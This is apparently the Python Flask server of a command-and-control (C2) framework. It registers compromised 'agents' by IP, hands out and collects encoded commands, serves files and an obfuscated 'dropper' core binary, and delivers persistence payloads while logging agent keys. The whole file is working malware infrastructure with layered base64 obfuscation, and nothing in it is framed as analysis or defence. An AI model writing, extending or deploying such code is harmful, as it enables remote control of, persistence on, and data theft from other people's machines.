from isnotcore import config
from flask import Flask
from flask import request, send_from_directory
import sys
import base64
from sqlite3 import Error
import re
import os
import logging
from os import listdir
from os.path import isfile, join
import time
from datetime import datetime
import string
import random


app = Flask(__name__)


def random_str(N):
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=N))


def to_binary(a):
    l, m = [], []
    for i in a:
        l.append(ord(i))
    for i in l:
        m.append(int(bin(i)[2:]))
    return list_to_string(m)


def to_base64_d(b64):
    #print("1_bs64 = " + b64) UFQxM1UzZEZWVlE9
    b64 = base64.b64decode(b64)
    b64 = base64.b64decode(b64)
    b64 = b64[::-1]
    b64 = base64.b64decode(b64)
    b64 = base64.b64decode(b64)
    return b64.decode('utf-8')
    #print("bs64 = " + b64.decode('utf-8'))
    #print(len(b64.strip()))
    #if len(b64) > 1:
    #    pass
    #else:
    #    print("bs64 = " + b64.decode('utf-8'))
    #    return b64.decode('utf-8')


def to_my_encode(b64):
    b64 = b64.encode('utf-8')
    b64 = base64.b64encode(b64)
    b64 = base64.b64encode(b64)
    b64 = b64[::-1]
    b64 = base64.b64encode(b64)
    b64 = base64.b64encode(b64)
    return b64.decode('utf-8')

def to_one_base64(b64):
    b64 = b64.encode('utf-8')
    b64 = base64.b64encode(b64)
    return b64.decode('utf-8')

def encode(b64):
    b64 = base64.b64encode(b64)
    return re.findall('..', b64.encode("hex"))


def list_to_string(s):
    str1 = ""
    for ele in s:
        ele = ele * config.Bincode
        str1 += "," + str(ele)
    return str1


def register(ip, data):
    agent_time = time.time()
    timestamp = datetime.fromtimestamp(agent_time)
    #first_time = datetime.now()
    #print(first_time)
    #print(str(timestamp.strftime('%Y-%m-%d %H:%M:%S')))
    if data.count("|") == 4:
        a_id = config.COUNT
        #print(config.COUNT)
        #print(a_id)
        data = data.split('||')
        config.agents.update({a_id: data})
        # print(config.agents)
        print("")
        print(str(a_id) + " => New Agent Add in " + str(timestamp.strftime('%Y-%m-%d %H:%M:%S')) + " With IP " + str(ip))
        config.times.update({a_id: str(timestamp.strftime('%Y-%m-%d %H:%M:%S'))})
        config.ips.update({a_id: str(ip)})
        data_command = str(random_str(7))
        data_command = (data_command + ":" + "")
        data_command = data_command.split(":")
        config.commands.update({a_id: data_command})
        # print(config.commands)
        # print(config.commands[config.COUNT][0])
        return config.commands[a_id][0]
    else:
        print("\n \033[1;32;40m Bad Register PIP Error \033[0m \n")
        return ""


def getlist(arg_dict):
    out_list = []
    for key in arg_dict:
        out_list.append(str(key))
    return out_list




@app.route('/')
def hello_world():
    return ''


@app.route(config.endpoints['login'])
def login():
    ip = request.environ.get('HTTP_X_REAL_IP', request.remote_addr)
    data = request.args.get('info')
    check = register(ip, data)

    if check:
        config.set_count(config.COUNT + 1)
        return check

@app.route(config.endpoints['sendcommand'])
# Send Command
# Update time
def sendcommand():
    data = request.args.keys()
    for i in data:
        if i:
            #print("apiv4 => "+str(i))
            #print("len => "+str(len(config.commands)))
            if len(config.commands) == 0:
                return to_my_encode("0")
                # print(config.commands)
                # print(len(config.commands))
            r = int(len(config.commands))
            # print(r)
            # print(config.COUNT)
            for item in range(r):
                item += 1
                #print("TESTTTTTTTTTTTTTTTT: " + str(item))
                data_command = config.commands[item][0]
                if data_command == str(i):
                    # print(data_command + " = " + config.commands[item][0])
                    # print(config.commands[item][1])
                    #print(str(data_command) + " => Req For Update Time")
                    agent_time = time.time()
                    timestamp = datetime.fromtimestamp(agent_time)
                    config.times.update({item: str(timestamp.strftime('%Y-%m-%d %H:%M:%S'))})
                    return config.commands[item][1]
                    # print(command)
            return to_my_encode("0")
        else:
            return to_my_encode("0")


@app.route(config.endpoints['getcommand'])
# GET Command
def getcommand():
    data = request.args.values()
    keys = request.args.keys()
    req_key = getlist(keys)
    key_item = 0
    #print(config.commands)
    #print(keys)
    for j in data:
        result = str(to_base64_d(j))
        result = result.rstrip()
        #print(type(result))
        #print(len(result))
        if len(result) > 1:
            print("")
            print(result)
            print("")
            r = int(len(config.commands))
            for item in range(r):
                item += 1
                data_command = config.commands[item][0]
                #print(req_key[0])
                #print(data_command + "=" + str(req_key[0]))
                if data_command == str(req_key[0]):
                    #print("Empty__1")
                    (config.commands[int(item)][1]) = ""
        else:
            r = int(len(config.commands))
            for item in range(r):
                item += 1
                data_command = config.commands[item][0]
                #print(data_command + "=" + str(req_key[0]))
                if data_command == str(req_key[0]):
                    #print("Empty__2")
                    (config.commands[int(item)][1]) = ""
        # print(j)
    return ""


@app.route(config.endpoints['download']+'<path:path>')
def download_file(path):
    print("\n \n \033[1;32;40m Who is it? " + str(path) + "\033[0m")
    file_name = path.split("|")[0]
    file_id = path.split("|")[1]
    
    upload_tok = file_id[-10:]
    file_id = file_id.split(upload_tok)[0]
    if upload_tok == config.upload_tokens:
        print("\033[1;32;40m Download request for " + str(file_name) + "|" + str(file_id) + "  =>  " + str(upload_tok) + "\033[0m \n")
        #print("IF " + str(upload_tok) + "=" + str(config.upload_tokens))
        #print(config.commands)
        r = int(len(config.commands))
        #print(r)
        for item in range(r):
            item += 1
            #print(item)
            data_command = config.commands[item][0]
            #print("IF " + str(data_command) + "=" + str(file_id))
            if data_command == str(file_id):
                only_files = [f for f in listdir("./file/") if isfile(join('./file/', f))]
                if str(file_name) in only_files:
                    f_path = "../file/"
                    (config.commands[int(item)][1]) = ""
                    #print(config.commands)
                    config.upload_tokens = ""
                    return send_from_directory(f_path, file_name, as_attachment=True)
                    
                else:
                    return ""
            else:
                pass
    else:
        return ""


#@app.route('/apiy7')
@app.route(config.endpoints['GET_CORE_Binery'])
# GET CORE Binery
def GET_CORE_Binery():
    # print(config.server)
    payload = config.core
    data = request.args.values()
    if data:
        for j in data:
            # print(j)
            if j == config.apiy7_RandomToken:
                print("\033[1;32;40m \nDroper Bin Executed:" + j + "\n \033[0m")
                #print(to_binary(payload))
                #print(config.spiter_Array_string)
                return to_binary(payload).replace("0",config.spiter_Array_string)
            else:
                return ""
        else:
            return ""


# @app.route('/apiv8')
# # server_hex
# def apiv8():
#     # print(config.server_hex)
#     payload = config.HEX
#     data = request.args.values()
#     if data:
#         for j in data:
#             # print(j)
#             if j == config.apiv8_RandomToken:
#                 print("\033[1;32;40m \nDroper HEX Executed:" + j + "\n \033[0m")
#                 return payload.encode("utf-8").hex()
#             else:
#                 return ""
#         else:
#             return ""


#@app.route('/apip9')
@app.route(config.endpoints['Persist'])
# Persist
def Persist():
    config.persist()
    data = request.args.values()
    keys = request.args.keys()
    key_req = ""
    for k in keys:
        key_req = k
    if key_req == config.persist_RandomToken:
        for j in data:
            register_persist_id = j.split(":")[0]
            print("\nPersist Request uuid " + register_persist_id)
            if len(config.persist_id) == 0:
                f = open("keys.txt", "a")
                f.write(j + '\n')
                f.close()
            for persist_id in config.persist_id:
                if persist_id == register_persist_id:
                    print("register_persist_id Exist")
                    return ""
                else:
                    f = open("keys.txt", "a")
                    f.write(j + '\n')
                    f.close()
    #print(config.persist_id)
    return config.login_RandomToken

#@app.route('/apid10')
@app.route(config.endpoints['Persist_Core'])
def Persist_Core():
    #print("Persist_Core - apid10")
    config.persist()
    data = request.args.values()
    for j in data:
        register_persist_id = j.split(":")[0]
    #print(register_persist_id)
    #print(config.persist_id)
    for persist_id in config.persist_id:
        # print(persist_id)
        #print(persist_id +"=="+ register_persist_id)
        if persist_id == register_persist_id:
            #print("TEST")
            #print(config.persist_RandomToken_genarator())
            #print(persist_encode_basehash_b52(config.persist_core))
            #persist_data = config.persist_encode_basehash_b52(config.persist_core)
            #print(persist_data)
            #persist_data = config.xor_crypt_string(persist_data, encode=True)
            #print(persist_data.decode('utf-8'))
            #persist_data = config.persist_encode_basehash_b52(persist_data.decode('utf-8'))
            #print(to_one_base64(config.persist_core))
            #print(xor_crypt_string(xor_crypt_string(secret_data, encode=True), decode=True))

            return to_one_base64(config.persist_core)
    #print(config.persist_id)
    return ""

#@app.route('/apid11')
@app.route(config.endpoints['Persist_Core_Run'])
def Persist_Core_Run():
    config.persist()
    data = request.args.values()
    for j in data:
        register_persist_id = j.split(":")[0]
    #print(register_persist_id)
    #print(config.persist_id)
    for persist_id in config.persist_id:
        # print(persist_id)
        #print(persist_id +"=="+ register_persist_id)
        if persist_id == register_persist_id:
            #print("TEST")
            #print(config.persist_RandomToken_genarator())
            #print(persist_encode_basehash_b52(config.persist_core))
            #persist_data = config.persist_encode_basehash_b52(config.persist_core)
            #print(persist_data)
            #persist_data = config.xor_crypt_string(persist_data, encode=True)
            #print(persist_data.decode('utf-8'))
            #persist_data = config.persist_encode_basehash_b52(persist_data.decode('utf-8'))
            #print(to_one_base64(config.persist_core))
            #print(xor_crypt_string(xor_crypt_string(secret_data, encode=True), decode=True))

            return to_one_base64(config.persist_core_un)
    #print(config.persist_id)
    return ""

def main():
    try:
        log = logging.getLogger('werkzeug')
        log.setLevel(logging.CRITICAL)
        os.environ['WERKZEUG_RUN_MAIN'] = 'False'
        app.run(host=config.vps['ip'], port=int(config.vps['port']), threaded=True)

    except Error as e:
        print("\033[1;32;40m Open Your Eyes \033[0m \n ")
        print(e)
        sys.exit()


if __name__ == "__main__":
    main
